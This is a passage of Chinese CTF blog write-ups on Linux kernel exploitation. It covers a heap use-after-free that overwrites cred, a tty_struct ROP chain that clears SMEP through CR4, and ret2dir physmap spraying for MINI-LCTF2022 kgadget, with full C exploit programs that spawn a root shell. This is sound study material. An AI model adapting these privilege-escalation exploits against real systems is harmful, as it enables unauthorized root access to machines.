<span class="hljs-title function_">cred_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">/* allocate a slab in which we can store credentials */</span><br>cred_jar = kmem_cache_create(<span class="hljs-string">&quot;cred_jar&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> cred),<br>     <span class="hljs-number">0</span>, SLAB_HWCACHE_ALIGN|SLAB_PANIC, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以通过cat &#x2F;proc&#x2F;slabinfo查看kmem_cache，本机有cred_jar而qemu起的题目是没有的</p><img src="/2023/08/16/kernel-heap-uaf/cred_jar.png" class title="cred_jar"><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel.h&quot;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> fd1 = open_dev(<span class="hljs-string">&quot;/dev/babydev&quot;</span>);<br>    <span class="hljs-keyword">if</span>(fd1 &lt; <span class="hljs-number">0</span>)<br>        fail_print(<span class="hljs-string">&quot;Open Fail!&quot;</span>);<br>    <span class="hljs-type">int</span> fd2 = open_dev(<span class="hljs-string">&quot;/dev/babydev&quot;</span>);<br>    <span class="hljs-keyword">if</span>(fd2 &lt; <span class="hljs-number">0</span>)<br>        fail_print(<span class="hljs-string">&quot;Open Fail!&quot;</span>);<br>    <br>    ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0xa8</span>);<br>    close(fd1);<br><br>    <span class="hljs-type">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span>(pid &lt; <span class="hljs-number">0</span>)<br>        fail_print(<span class="hljs-string">&quot;Fork Fail!&quot;</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-type">char</span> buf[<span class="hljs-number">30</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>        write(fd2, buf, <span class="hljs-number">28</span>);<br><br>        <span class="hljs-keyword">if</span>(getuid() == <span class="hljs-number">0</span>)<br>        &#123;<br>            success_print(<span class="hljs-string">&quot;Get Root Successfully!&quot;</span>);<br>            system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            fail_print(<span class="hljs-string">&quot;Get Root Fail!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        wait(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h2><p>这种思路类似于FSOP（都是打结构体的跳转表）</p><p>劫持&#x2F;dev&#x2F;ptmx伪终端的的tty_struct结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> &#123;</span><br><span class="hljs-type">int</span>magic;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kref</span> <span class="hljs-title">kref</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">dev</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">int</span> index;<br>    <br>    ……        <br>&#125;<br></code></pre></td></tr></table></figure><p>tty_operations跳转表长这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> * (*<span class="hljs-title">lookup</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span>, <span class="hljs-title">int</span> <span class="hljs-title">idx</span>);</span><br><span class="hljs-type">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br><span class="hljs-type">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br><span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,<br>      <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);<br><br>    ……<br>&#125;<br></code></pre></td></tr></table></figure><p>由于没有开启SMAP保护，内核态可以访问用户空间数据，所以可以在用户空间布置ROP链和fake tty_operarions，这里劫持write函数的指针，使用一个gadget可以使eax和esp的高4字节为0并交换两者的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0xffffffff8100008a</span> : xchg eax, esp ; ret<br></code></pre></td></tr></table></figure><p>调用write函数的指令如下，此时rax是fake_operations的地址，是可控的，使高4字节为0时的地址还在用户空间，可以利用mmap获得这块内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:FFFFFFFF814DC0C3                 call    qword ptr [rax+<span class="hljs-number">38</span>h]<br></code></pre></td></tr></table></figure><p>这样就完成了栈迁移，在mmap的区域布置提权的ROP链就行</p><h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> XCHG_EAX_ESP_RET 0xffffffff8100008a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810d238d</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff81063694          </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ_RET 0xffffffff814e35ef</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    save_status();<br>    <br>    commit_creds = <span class="hljs-number">0xffffffff810a1420</span>;<br>    prepare_kernel_cred = <span class="hljs-number">0xffffffff810a1810</span>; <br><br>    <span class="hljs-type">int</span> fd1 = open_dev(<span class="hljs-string">&quot;/dev/babydev&quot;</span>), fd2 = open_dev(<span class="hljs-string">&quot;/dev/babydev&quot;</span>);<br>    ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0x2e0</span>);  <span class="hljs-comment">// tty_struct结构体大小为0x2e0</span><br>    close(fd1);<br><br>    <span class="hljs-type">int</span> tty_fd = open_dev(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>);<br><br>    <span class="hljs-type">size_t</span> fake_ops[<span class="hljs-number">8</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, XCHG_EAX_ESP_RET&#125;;<br>    <span class="hljs-type">size_t</span> fake_stack = (<span class="hljs-type">size_t</span>)(&amp;fake_ops) &amp; <span class="hljs-number">0xffffffff</span>;<br>    <span class="hljs-type">size_t</span> * fake_stack_ptr = mmap((<span class="hljs-type">size_t</span>)(fake_stack &amp; <span class="hljs-number">0xfffffffffffff000</span>), <span class="hljs-number">0x10000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(!fake_stack_ptr)<br>        fail_print(<span class="hljs-string">&quot;Mmap Fail!&quot;</span>);<br>    fake_stack_ptr = (<span class="hljs-type">size_t</span>)fake_stack;<br><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    fake_stack_ptr[i++] = POP_RDI_RET;<br>    fake_stack_ptr[i++] = <span class="hljs-number">0x6f0</span>;<br>    fake_stack_ptr[i++] = MOV_CR4_RDI_POP_RBP_RET;<br>    fake_stack_ptr[i++] = <span class="hljs-number">0</span>;<br>    fake_stack_ptr[i++] = (<span class="hljs-type">size_t</span>)get_root_privilige;<br>    fake_stack_ptr[i++] = SWAPGS_POP_RBP_RET;<br>    fake_stack_ptr[i++] = <span class="hljs-number">0</span>;<br>    fake_stack_ptr[i++] = IRETQ_RET;<br>    fake_stack_ptr[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    fake_stack_ptr[i++] = user_cs;<br>    fake_stack_ptr[i++] = user_rflags;<br>    fake_stack_ptr[i++] = user_sp + <span class="hljs-number">8</span>;<br>    fake_stack_ptr[i++] = user_ss;<br><br>    <span class="hljs-type">int</span> tty_cnt = <span class="hljs-number">4</span> + <span class="hljs-number">4</span> + <span class="hljs-number">8</span> + <span class="hljs-number">8</span>;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x100</span>];<br>    read(fd2, buf, tty_cnt);    <span class="hljs-comment">// 0xffff880005f03800</span><br><br>    *(<span class="hljs-type">size_t</span> *)(&amp;buf[tty_cnt]) = &amp;fake_ops;<br>    write(fd2, buf, tty_cnt + <span class="hljs-number">8</span>);<br><br>    <span class="hljs-type">int</span> buf1[] = &#123;<span class="hljs-number">0</span>&#125;;<br>    write(tty_fd, buf1, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>heap</tag>
      
      <tag>uaf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kernel ROP ret2dir</title>
    <link href="/2023/08/10/kernel-ROP-ret2dir/"/>
    <url>/2023/08/10/kernel-ROP-ret2dir/</url>
    
    <content type="html"><![CDATA[<p>论如何逐渐偏离主题：ret2dir看不懂→看内存相关源码解析→想调试看页表初始化→找不到入口从BIOS开始调试→调试到页表初始化结束→终于结束了开始ret2dir</p><p>感觉干了几天跟没干一样，但确实对内存映射有了实感，勉强算一种收获吧（以后再也不钻牛角尖了我发誓╥﹏╥…）</p><span id="more"></span><p>先说明一下一个用到的结构体pt_regs</p><h1 id="pt-regs"><a href="#pt-regs" class="headerlink" title="pt_regs"></a>pt_regs</h1><p>pt_regs结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pt_regs</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span><br><span class="hljs-comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r15;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r14;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r13;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r12;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> bp;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> bx;<br><span class="hljs-comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r11;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r10;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r9;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r8;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ax;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cx;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> dx;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> si;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> di;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span><br><span class="hljs-comment"> * On hw interrupt, it&#x27;s IRQ number:</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> orig_ax;<br><span class="hljs-comment">/* Return frame for iretq */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ip;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cs;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sp;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ss;<br><span class="hljs-comment">/* top of stack page */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>在进行系统调用之前会把寄存器入栈，入栈的结构和pt_regs相符（是正着的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SYM_CODE_START(entry_SYSCALL_64)<br>UNWIND_HINT_EMPTY<br><br>swapgs<br>/* tss.sp2 is scratch space. */<br>movq%rsp, PER_CPU_VAR(cpu_tss_rw + TSS_sp2)<br>SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp<br>movqPER_CPU_VAR(cpu_current_top_of_stack), %rsp<br><br>SYM_INNER_LABEL(entry_SYSCALL_64_safe_stack, SYM_L_GLOBAL)<br><br>/* Construct struct pt_regs on stack */<br>pushq$__USER_DS/* pt_regs-&gt;ss */<br>pushqPER_CPU_VAR(cpu_tss_rw + TSS_sp2)/* pt_regs-&gt;sp */<br>pushq%r11/* pt_regs-&gt;flags */<br>pushq$__USER_CS/* pt_regs-&gt;cs */<br>pushq%rcx/* pt_regs-&gt;ip */<br>SYM_INNER_LABEL(entry_SYSCALL_64_after_hwframe, SYM_L_GLOBAL)<br>pushq%rax/* pt_regs-&gt;orig_ax */<br><br>PUSH_AND_CLEAR_REGS rax=$-ENOSYS<br><br>/* IRQs are off. */<br>movq%rax, %rdi<br>movq%rsp, %rsi<br>calldo_syscall_64/* returns with IRQs disabled */<br>……<br></code></pre></td></tr></table></figure><p>有一部分压栈操作在PUSH_AND_CLERT_REGS宏里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">.macro PUSH_AND_CLEAR_REGS rdx=%rdx rax=%rax save_ret=<span class="hljs-number">0</span><br>.<span class="hljs-keyword">if</span> \save_ret<br>pushq%rsi<span class="hljs-comment">/* pt_regs-&gt;si */</span><br>movq<span class="hljs-number">8</span>(%rsp), %rsi<span class="hljs-comment">/* temporarily store the return address in %rsi */</span><br>movq%rdi, <span class="hljs-number">8</span>(%rsp)<span class="hljs-comment">/* pt_regs-&gt;di (overwriting original return address) */</span><br>.<span class="hljs-keyword">else</span><br>pushq   %rdi<span class="hljs-comment">/* pt_regs-&gt;di */</span><br>pushq   %rsi<span class="hljs-comment">/* pt_regs-&gt;si */</span><br>.endif<br>pushq\rdx<span class="hljs-comment">/* pt_regs-&gt;dx */</span><br>pushq   %rcx<span class="hljs-comment">/* pt_regs-&gt;cx */</span><br>pushq   \rax<span class="hljs-comment">/* pt_regs-&gt;ax */</span><br>pushq   %r8<span class="hljs-comment">/* pt_regs-&gt;r8 */</span><br>pushq   %r9<span class="hljs-comment">/* pt_regs-&gt;r9 */</span><br>pushq   %r10<span class="hljs-comment">/* pt_regs-&gt;r10 */</span><br>pushq   %r11<span class="hljs-comment">/* pt_regs-&gt;r11 */</span><br>pushq%rbx<span class="hljs-comment">/* pt_regs-&gt;rbx */</span><br>pushq%rbp<span class="hljs-comment">/* pt_regs-&gt;rbp */</span><br>pushq%r12<span class="hljs-comment">/* pt_regs-&gt;r12 */</span><br>pushq%r13<span class="hljs-comment">/* pt_regs-&gt;r13 */</span><br>pushq%r14<span class="hljs-comment">/* pt_regs-&gt;r14 */</span><br>pushq%r15<span class="hljs-comment">/* pt_regs-&gt;r15 */</span><br>UNWIND_HINT_REGS<br>        ……<br></code></pre></td></tr></table></figure><h1 id="例题：MINI-LCTF2022-kgadget"><a href="#例题：MINI-LCTF2022-kgadget" class="headerlink" title="例题：MINI-LCTF2022 - kgadget"></a>例题：MINI-LCTF2022 - kgadget</h1><p>arttnba3师傅的博客讲的很清楚的了就不说了</p><h2 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h2><p>进入call rbx，程序跳至gadget：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add    rsp, 0xa0<br>pop    rbx<br>pop    r12<br>pop    r13<br>pop    rbp<br>ret<br></code></pre></td></tr></table></figure><img src="/2023/08/10/kernel-ROP-ret2dir/gdb1.png" class title="gdb1"><p>执行完gadget后栈顶是储存r9的地址，之后就是try_hit</p><img src="/2023/08/10/kernel-ROP-ret2dir/gdb2.png" class title="gdb2"><p>执行完r9的pop rsp后try_hit被pop到rsp中，栈就被搬到了direct mapping area里</p><img src="/2023/08/10/kernel-ROP-ret2dir/gdb3.png" class title="gdb3"><p>之后ret就会执行写入的ROP链</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>这次使用commit_creds(&amp;init_cred)提权</p><p>ps：要注意一下ioctl的第三个参数是个指针，不是直接数值传递所以必须将gadget先写进一块内核空间，即direct mapping area</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ADD_RSP_0XA0_POP_RBX_POP_R12_POP_R13_POP_RBP_RET 0xffffffff810737fe</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RET 0xffffffff8108c6f1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff8108c6f0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82a6b700</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810c92e0;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00fb0 + 27</span><br><br><span class="hljs-type">size_t</span> pop_rsp_ret = <span class="hljs-number">0xffffffff811483d0</span>;<br><span class="hljs-type">size_t</span> *physmap_spray_arr[<span class="hljs-number">16000</span>];<br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">size_t</span> try_hit;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_rop_chain</span><span class="hljs-params">(<span class="hljs-type">size_t</span> *rop)</span><br>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    rop[i++] = ADD_RSP_0XA0_POP_RBX_POP_R12_POP_R13_POP_RBP_RET;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">1</span>; i &lt;= (<span class="hljs-number">0xa0</span> + <span class="hljs-number">4</span> * <span class="hljs-number">8</span>) / <span class="hljs-number">8</span>; i++)<br>        rop[i] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop[i++] = POP_RDI_RET;<br>    rop[i++] = INIT_CRED;<br>    rop[i++] = COMMIT_CREDS;<br>    rop[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;<br>    rop[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop[i++] = user_cs;<br>    rop[i++] = user_rflags;<br>    rop[i++] = user_sp + <span class="hljs-number">8</span>;<br>    rop[i++] = user_ss;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    save_status();<br><br>    fd = open_dev(<span class="hljs-string">&quot;/dev/kgadget&quot;</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)<br>        fail_print(<span class="hljs-string">&quot;Open Error!&quot;</span>);<br>    <span class="hljs-type">int</span> page_size = sysconf(_SC_PAGESIZE);<br>    <br>    <span class="hljs-type">size_t</span> rop_chain[page_size / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)];<br>    construct_rop_chain(rop_chain);<br>    <br>    trying_print(<span class="hljs-string">&quot;Spraying physmap...&quot;</span>);<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">15000</span>; i++)<br>    &#123;<br>        physmap_spray_arr[i] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(!physmap_spray_arr[i])<br>            fail_print(<span class="hljs-string">&quot;Mmap Error!&quot;</span>);<br>        <span class="hljs-built_in">memcpy</span>(physmap_spray_arr[i], rop_chain, page_size);<br>    &#125;<br><br>    trying_print(<span class="hljs-string">&quot;trigger physmap one_gadget...&quot;</span>);<br>    try_hit = <span class="hljs-number">0xffff888000000000</span> + <span class="hljs-number">0x7000000</span>;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>        <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>        <span class="hljs-string">&quot;mov r13,   0x22222222;&quot;</span><br>        <span class="hljs-string">&quot;mov r12,   0x33333333;&quot;</span><br>        <span class="hljs-string">&quot;mov rbp,   0x44444444;&quot;</span><br>        <span class="hljs-string">&quot;mov rbx,   0x55555555;&quot;</span><br>        <span class="hljs-string">&quot;mov 